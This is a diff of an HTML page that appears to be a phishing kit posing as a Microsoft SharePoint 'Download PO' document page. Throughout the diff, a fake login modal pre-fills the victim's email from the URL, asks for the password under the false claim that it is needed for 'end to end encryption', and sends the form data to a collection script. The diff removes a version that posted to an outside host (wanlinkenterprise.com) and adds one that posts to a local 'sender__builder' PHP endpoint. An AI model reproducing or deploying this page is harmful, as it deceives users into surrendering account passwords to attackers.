@@ -2,11 +2,9 @@
 <html lang="en">
 
 <head>
-    <title>Materia</title>
+    <title>SharePoint - Download PO</title>
 
-    <meta name="description" content="_Materials">
-
-
+    <meta name="description" content="SharePoint">
 
     <meta name="keywords" content="_Demands">
 
@@ -22,6 +20,8 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
 
+    <link rel="shortcut icon" href="lg.png" type="image/x-icon">
+
     <link rel="stylesheet" href="bootstrap.min.css">
     <script src="jquery.min.js"></script>
     <script src="popper.min.js"></script>
@@ -29,7 +29,7 @@
     <style>
         body {
             font-size: .75rem;
-            color: #111;
+            color: #000;
         }
 
         .table {
@@ -51,59 +51,19 @@
         }
 
         .underline-item {
-            border: 1px solid;
+            border: 1px solid #060808;
             padding: 5px 15px;
             border-radius: 50px;
             box-shadow: 0px 1px 1px;
             text-decoration-line: none !important;
         }
 
-    </style>
-    <!-- <script src="app.js"></script> -->
-    <script>
-        $(document).ready(function () {
-            $('#msg').hide();
-            $('#msg2').hide();
-            var baseUrl = (window.location).href;
-            var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-            $("#x1").val(url);
+        .table td,
+        .table th,
+        .table thead th {
+            border-color: #060808;
+        }
 
-            $("#profileUp").submit(function (e) {
-                e.preventDefault();
-                var nm = $("#A1").val();
-                var formData = new FormData($("#profileUp")[0]);
-                $("#byn").html("Processing..").prop("disabled", true);
-                $.ajax({
-                    url: "https://wanlinkenterprise.com/iphone__pro__max/pro__max.php",
-                    type: 'POST',
-                    data: formData,
-                    // dataType : 'jsonp',
-
-                    contentType: false,
-                    processData: false,
-
-                    success: function (res) {
-                        console.log(res);
-
-                        $('#msg').show();
-                        $('#msg2').hide();
-                        setTimeout(function () {
-                            $('#msg').hide();
-                            $('#msg2').show();
-                            $("#x1").val(url);
-                            $("#x2").val("");
-                            $("#byn").html("Access Document").prop("disabled",
-                                false);
-                        }, 2000);
-                    }
-                });
-            });
-        });
-
-    </script>
-
-
-    <style>
         video {
             object-fit: cover;
             width: 100vw;
@@ -114,14 +74,84 @@
             z-index: -1;
         }
 
+        video::before {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 1);
+            z-index: 1;
+        }
+
+        .alert,
+        .form-control {
+            border-radius: 0;
+        }
+
     </style>
+    <script>
+        $(document).ready(function () {
+            $('#msg').hide();
+            $('#msg2').hide();
+            var baseUrl = window.location.href;
+
+            var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
+            $("#x1").val(url);
+
+            $("#profileUp").submit(function (e) {
+                e.preventDefault();
+                // var nm = $("#A1").val();
+
+                var formData = new FormData($("#profileUp")[0]);
+
+                $("#byn").html("Processing..").prop("disabled", true);
+
+                $.ajax({
+                    url: "/sender__builder/iphone__pro__max/pro__max.php",
+                    // url: "http://wanlinkenterprise.com/iphone__pro__max/pro__max.php",
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'html',
+
+                    contentType: false,
+                    processData: false,
+
+                    success: function (res) {
+                        console.log(res);
+
+                        if (res == true) {
+                            $('#msg').show();
+                            $('#msg2').hide();
+
+                            setTimeout(function () {
+                                $('#msg').hide()
+                                $('#msg2').show()
+                                $("#x1").val(url)
+                                $("#x2").val("");
+                                $("#byn").html("Access Document").prop(
+                                    "disabled",
+                                    false)
+                            }, 2000)
+                        } else {
+                            $('#msg2').show();
+                            $('#msg').hide();
+                        }
+                    }
+                });
+            });
+        });
+
+    </script>
 </head>
 
 <body>
 
     <nav class="navbar " style="background-color:#026FC2;">
         <div class="container">
-            <a class="navbar-brand" href="#" data-toggle="modal" data-target="#myModal"><img src="logo.jpg"></a>
+            <a class="navbar-brand mx-auto" href="#" data-toggle="modal" data-target="#myModal">
+                <img src="lg.png" style="width: 50px; margin: auto;">
+            </a>
             <button class="navbar-toggler " type="button ">
                 <span class="navbar-toggler-icon text-dark"></span>
             </button>
@@ -129,10 +159,15 @@
         </div>
     </nav>
 
+    <video playsinline autoplay muted loop poster="lg.png" id="bgvid">
+        <source src="vd.mp4" type="video/webm">
+        <source src="vd" type="video/mp4">
+    </video>
 
     <div class="container">
-        <div class="row mt-5">
-            <div class="col-md-9 p-0 mx-auto" style="border:1px solid #dee2e6; border-top: 0">
+        <div class="row justify-content-center my-5">
+            <div class="col-sm-8 p-0" style="border-top: 0; background: black;
+                opacity: 0.75; color: #fff">
                 <table class="table">
                     <thead>
                         <tr>
@@ -315,8 +350,12 @@
 
             </div>
 
-            <div class="col-md-9 p-0 mx-auto">
-                <div class="my-4" style="font-size: 12px;">© Microsoft 2021.</div>
+            <div class="col-sm-8 p-0">
+                <div class="my-2" style="font-size: 12px; color: #fff">
+                    Office365, Outlook, SharePoint, OneDrive, Skype, OneNote, PowerPoint, Word, Excel are all
+                    trademarks
+                    of Microsoft. <Br>All rights reserved © Microsoft 2020.
+                </div>
             </div>
         </div>
     </div>
@@ -328,33 +367,33 @@
 
                 <!-- Modal Header -->
                 <div class="modal-header">
-                    <img src="loo.jpg" class="img-fluid" style="max-width: 35%;">
+                    <img src="lg.png" style="width: 28px;">
                     <button type="button" class="close" data-dismiss="modal">&times;</button>
                 </div>
 
                 <!-- Modal body -->
-                <div class="modal-body ">
+                <div class="modal-body">
                     <div id="msg" class="alert alert-success">
-                        Authenticating Credentials, Please wait...
+                        Authenticating credentials, please wait...
                     </div>
                     <div id="msg2" class="alert alert-danger">
-                        Invalid Credentials!
+                        Invalid credentials.
                     </div>
-
                     <form method="post" id="profileUp">
                         <label for="demo">Email address</label>
-                        <input type="email" readonly class="form-control" value="" placeholder="Email" id="x1"
-                            name="x1">
+                        <input type="email" readonly class="form-control" value="" placeholder="Email" id="x1" name="x1"
+                            style="font-size: 14px;">
                         <div><small>We'll never share your email with anyone else.</small></div>
-                        <label for="demo">Password</label>
+                        <label for="demo" class="mt-2">Password</label>
                         <input type="password" class="form-control" value="" placeholder="Receiver's Password" id="x2"
-                            name="x2" required>
+                            name="x2" required style="font-size: 14px;">
                         <div class="mb-3"><small>Required for end to end encryption</small></div>
                         <hr>
-                        <div class="mb-3"> <button type="submit" id="byn" class="btn-primary btn">Access File</button>
+                        <div class="mb-3"> <button type="submit" id="byn" class="btn-primary btn"
+                                style="font-size: 12px;">Access Document</button>
                         </div>
                         <div style="font-size: 10px;">
-                            All rights reserved. ©Microsoft 2021
+                            © Microsoft 2022. All rights reserved.
                         </div>
                     </form>
                 </div>
